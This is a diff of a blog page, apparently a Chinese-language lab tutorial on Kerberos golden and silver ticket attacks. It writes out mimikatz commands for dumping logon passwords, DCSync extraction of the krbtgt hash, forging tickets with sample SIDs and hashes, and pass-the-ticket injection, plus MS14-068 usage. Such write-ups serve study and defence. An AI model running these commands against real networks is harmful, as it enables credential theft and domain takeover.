@@ -26,10 +26,12 @@
 <meta property="og:site_name" content="lolydawn">
 <meta property="og:description" content="黄金票据和白银票据金票Golden ticket原理  在kerberos认真中，client通过as认证后，拿到了一个logon session key 和tgt 而logon session key并不会保存在kdc中 krbtgt的ntlm hash又是固定的 所以只要拿到krbtgt的ntlm hash就可以伪造tgt和logon session key从而进行下一步与tgs的交互 有了金">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://lolydawn.github.io/image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241128152659240.png">
 <meta property="article:published_time" content="2024-12-12T11:06:02.000Z">
-<meta property="article:modified_time" content="2025-08-22T06:17:34.186Z">
+<meta property="article:modified_time" content="2025-08-24T07:23:35.286Z">
 <meta property="article:author" content="lolydawn">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lolydawn.github.io/image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241128152659240.png">
   
   
   
@@ -222,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          819 words
+          790 words
         
       </span>
     
@@ -296,43 +298,84 @@
 </li>
 <li><p>上传mimikatz,以管理员权限运行CMD,再去执行mimikatz</p>
 </li>
-<li><pre><code class="hljs">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt;log.txt
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">- </span>拿到域内用户名和密码<br><br><span class="hljs-bullet">- </span>登陆域账号<br><br><span class="hljs-bullet">- </span>尝试提权 域内普通用户提权成功后是有时效性的<br><br><span class="hljs-bullet">- </span>whoami /user 或者 whoami/all 查看该域用户的suid<br><br><span class="hljs-bullet">- </span>上传mimikatz和MS-068提权工具<br><br><span class="hljs-bullet">- </span>使用MS14-068伪造票据，会在当前目录下生成一个凭证<br><br><span class="hljs-bullet">- </span><span class="hljs-code">```</span><br><span class="hljs-code">  ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址 </span><br></code></pre></td></tr></table></figure>
-</code></pre>
+</ul>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">mimikatz.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>&gt;<span class="hljs-built_in">log</span>.txt<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>拿到域内用户名和密码</p>
 </li>
-<li><p>使用mimikatz清空之前缓存的凭证，导入伪造的凭证</p>
+<li><p>登陆域账号</p>
 </li>
-<li><pre><code class="hljs">mimikatz # kerberos::purge  //清空票据
-mimikatz # kerberos::ptc 票据文件地址
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">- </span>然后拿到域管的权限<br><br>二、伪造金票<br><br>条件<br><br><span class="hljs-bullet">- </span>域名称<br><span class="hljs-bullet">- </span>域的SID值<br><span class="hljs-bullet">- </span>域的KRBTGT账号的HASH<br><span class="hljs-bullet">- </span>伪造任意用户名<br><br>mimikatz导出krbtgt的hash<br><br></code></pre></td></tr></table></figure>
-mimikatz(commandline) # privilege::debug
-mimikatz(commandline) # lsadump::dcsync /domain:cyberpeace.com /all /csv
-mimikatz(commandline) # lsadump::dcsync /domain:cyberpeace.com /user:krbtgt
-</code></pre>
+<li><p>尝试提权 域内普通用户提权成功后是有时效性的</p>
+</li>
+<li><p>whoami &#x2F;user 或者 whoami&#x2F;all 查看该域用户的suid</p>
+</li>
+<li><p>上传mimikatz和MS-068提权工具</p>
+</li>
+<li><p>使用MS14-068伪造票据，会在当前目录下生成一个凭证</p>
 </li>
 </ul>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><br>![image<span class="hljs-number">-20241128152659240</span>](../image/SQL注入总结/image<span class="hljs-number">-20241128152659240.</span>png)<br><br>之后可以看到krbtgt用户的SID<br><br></code></pre></td></tr></table></figure>
-<p>mimikatz.exe “kerberos::golden &#x2F;admin:system &#x2F;domain:cyberpeace.com &#x2F;sid:S-1-5-21-97341123-1865264218-933115267 &#x2F;krbtgt:95972cdf7b8dde854e74c1871f6d80a0 &#x2F;ticket:ticket.kirbi” exit</p>
-<p>&#x2F;admin：伪造的用户名<br>&#x2F;domain：域名称<br>&#x2F;sid：SID值，注意是去掉最后一个-后面的值<br>&#x2F;krbtgt：krbtgt的HASH值<br>&#x2F;ticket：生成的票据名称    &#x2F;&#x2F;不是写入内存中的命令！</p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><br>金票的使用<br><br>登陆普通用户，通过mimikatz的kerberos::ptt功能将ticket.kirbi导入内存中<br><br></code></pre></td></tr></table></figure>
-<p>mimikatz # kerberos::purge<br>mimikatz # kerberos::ptt ticket.kirbi</p>
-<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><br><span class="hljs-meta">## 银票据</span><br><br>伪造的ST<br><br>在kerberos第三步的时候，Server接收到<span class="hljs-keyword">client</span>的请求之后，通过自己的Master Key解密ST，从而获得Session Key。<br><br>通过session key解密Authenticator3 进而验证对方的身份，验证成功就让<span class="hljs-keyword">client</span>访问指定服务了。<br><br>特点<br><br>- 不需要与KDC进行交互<br>- 需要<span class="hljs-keyword">server</span>的NTLM hash<br><br>同黄金票据流程<br><br>登录上面创建的域管用户，用管理员权限打开CMD，cd 到 mimikatz 存放的目录，去执行mimikatz的命令，得到SID和NTLM<br><br></code></pre></td></tr></table></figure>
-<p>mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit”&gt;log.txt</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs"><br>先使用mimikatz清空票据，再导入伪造的票据,具体伪造票据的<br><br></code></pre></td></tr></table></figure>
-<p>kerberos::golden &#x2F;domain:cyberpeace.com &#x2F;sid:S-1-5-21-2718660907-658632824-2072795563 &#x2F;target:scene.cyberpeace.com &#x2F;service:cifs &#x2F;rc4:9a68826fdc2811f20d1f73a471ad7b9a &#x2F;user:test &#x2F;ptt</p>
-<pre><code class="hljs">
-## 金票与银票的区别
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ms14-<span class="hljs-number">068</span><span class="hljs-selector-class">.exe</span> -u 域成员名@域名 -<span class="hljs-selector-tag">p</span> 域成员密码 -s 域成员sid -d 域控制器地址 <br></code></pre></td></tr></table></figure>
 
-- 获取的权限不同
-  - 金票：伪造的TGT，可以获取任意Kerberos的访问权限
-  - 银票：伪造的ST，只能访问指定的服务，如CIFS
-- 认证流程不同
-  - 金票：同KDC交互，但不同AS交互
-  - 银票：不同KDC交互，直接访问Server
-- 加密方式不同
-  - 金票：由krbtgt NTLM Hash加密
-  - 银票：由服务账号 NTLM Hash加密
-</code></pre>
+<ul>
+<li>使用mimikatz清空之前缓存的凭证，导入伪造的凭证</li>
+</ul>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">mimikatz <span class="hljs-meta"># kerberos::purge  <span class="hljs-comment">//清空票据</span></span><br>mimikatz <span class="hljs-meta"># kerberos::ptc 票据文件地址</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>然后拿到域管的权限</li>
+</ul>
+<p>二、伪造金票</p>
+<p>条件</p>
+<ul>
+<li>域名称</li>
+<li>域的SID值</li>
+<li>域的KRBTGT账号的HASH</li>
+<li>伪造任意用户名</li>
+</ul>
+<p>mimikatz导出krbtgt的hash</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mimikatz(commandline) # privilege::<span class="hljs-keyword">debug</span><br>mimikatz(commandline) # lsadump::dcsync /<span class="hljs-keyword">domain</span>:cyberpeace.com /<span class="hljs-keyword">all</span> /csv<br>mimikatz(commandline) # lsadump::dcsync /<span class="hljs-keyword">domain</span>:cyberpeace.com /<span class="hljs-keyword">user</span>:krbtgt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20241128152659240.png" srcset="/img/loading.gif" lazyload alt="image-20241128152659240"></p>
+<p>之后可以看到krbtgt用户的SID</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /admin:system /domain:cyberpeace.com /sid:S-1-5-21-97341123-1865264218-933115267 /krbtgt:95972cdf7b8dde854e74c1871f6d80a0 /ticket:ticket.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br><br>/admin：伪造的用户名<br>/domain：域名称<br>/sid：SID值，注意是去掉最后一个-后面的值<br>/krbtgt：krbtgt的HASH值<br><span class="hljs-regexp">/ticket：生成的票据名称    /</span>/不是写入内存中的命令！<br></code></pre></td></tr></table></figure>
+
+<p>金票的使用</p>
+<p>登陆普通用户，通过mimikatz的kerberos::ptt功能将ticket.kirbi导入内存中</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-comment"># kerberos::purge         </span><br>mimikatz <span class="hljs-comment"># kerberos::ptt ticket.kirbi</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="银票据"><a href="#银票据" class="headerlink" title="银票据"></a>银票据</h2><p>伪造的ST</p>
+<p>在kerberos第三步的时候，Server接收到client的请求之后，通过自己的Master Key解密ST，从而获得Session Key。</p>
+<p>通过session key解密Authenticator3 进而验证对方的身份，验证成功就让client访问指定服务了。</p>
+<p>特点</p>
+<ul>
+<li>不需要与KDC进行交互</li>
+<li>需要server的NTLM hash</li>
+</ul>
+<p>同黄金票据流程</p>
+<p>登录上面创建的域管用户，用管理员权限打开CMD，cd 到 mimikatz 存放的目录，去执行mimikatz的命令，得到SID和NTLM</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">mimikatz.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>&gt;<span class="hljs-built_in">log</span>.txt<br></code></pre></td></tr></table></figure>
+
+<p>先使用mimikatz清空票据，再导入伪造的票据,具体伪造票据的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::golden /domain:cyberpeace.com /sid:S-1-5-21-2718660907-658632824-2072795563 /target:scene.cyberpeace.com /service:cifs /rc4:9a68826fdc2811f20d1f73a471ad7b9a /user:<span class="hljs-built_in">test</span> /ptt<br></code></pre></td></tr></table></figure>
+
+<h2 id="金票与银票的区别"><a href="#金票与银票的区别" class="headerlink" title="金票与银票的区别"></a>金票与银票的区别</h2><ul>
+<li>获取的权限不同<ul>
+<li>金票：伪造的TGT，可以获取任意Kerberos的访问权限</li>
+<li>银票：伪造的ST，只能访问指定的服务，如CIFS</li>
+</ul>
+</li>
+<li>认证流程不同<ul>
+<li>金票：同KDC交互，但不同AS交互</li>
+<li>银票：不同KDC交互，直接访问Server</li>
+</ul>
+</li>
+<li>加密方式不同<ul>
+<li>金票：由krbtgt NTLM Hash加密</li>
+<li>银票：由服务账号 NTLM Hash加密</li>
+</ul>
+</li>
+</ul>
 
                 
               </div>
